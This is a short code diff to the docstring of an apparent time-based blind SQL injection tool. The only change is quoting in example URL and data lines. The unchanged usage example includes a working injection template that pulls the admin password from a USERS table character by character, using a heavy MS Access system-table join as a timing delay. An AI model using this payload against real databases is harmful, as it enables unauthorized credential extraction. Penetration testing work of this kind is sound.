@@ -60,8 +60,8 @@ class TimeBasedBlind(BlindInjectionBase):
         1) Create an injection template. Use tags {CHARCODE} for letter and {POSITION} for it's position
             sqli = 'username=admin\' and iif({CHARCODE}=(select top 1 asc(mid(password,{POSITION},1)) from USERS), (SELECT count(*) FROM MSysAccessStorage As T1, MSysAccessStorage AS T2)>0, \'\')'
         2) Create urllib2.Request object and put {INJECTION} tag to the point of injection
-            url = http://example.com/?param1= + '{INJECTION}' # if the injection is in the URL
-            data = param1=value&param2={INJECTION} # if the injection is in the data
+            url = 'http://example.com/?param1=' + '{INJECTION}' # if the injection is in the URL
+            data = 'param1=value&param2={INJECTION}' # if the injection is in the data
             headers = {'HeaderName':'{INJECTION}'} # if the injection is somewhere in the headers
             req = urllib2.Request(url, data, headers)
         3) Create TimeBasedBlind object. Pass request, sql injection template, delay(optional) and char pool(optional) to it
